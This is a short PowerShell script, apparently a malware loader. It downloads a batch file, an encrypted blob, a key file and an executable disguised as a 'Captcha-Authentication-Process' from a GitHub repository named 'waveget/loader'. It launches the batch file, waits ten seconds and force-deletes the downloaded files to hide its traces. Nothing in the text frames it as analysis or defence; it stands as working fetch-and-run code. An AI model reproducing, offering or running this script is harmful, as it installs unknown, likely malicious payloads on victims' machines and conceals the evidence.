
$urls = @(
    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/main.bat",
    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin",
    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/key.bin",
    "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/Captcha-Authentication-Process-820182.exe"
)

foreach ($url in $urls) {
    $filename = Split-Path -Leaf $url
    Invoke-WebRequest -Uri $url -OutFile $filename
}

Start-Process -FilePath "main.bat"

Start-Sleep -Seconds 10

foreach ($url in $urls) {
    $filename = Split-Path -Leaf $url
    Remove-Item $filename -Force
}
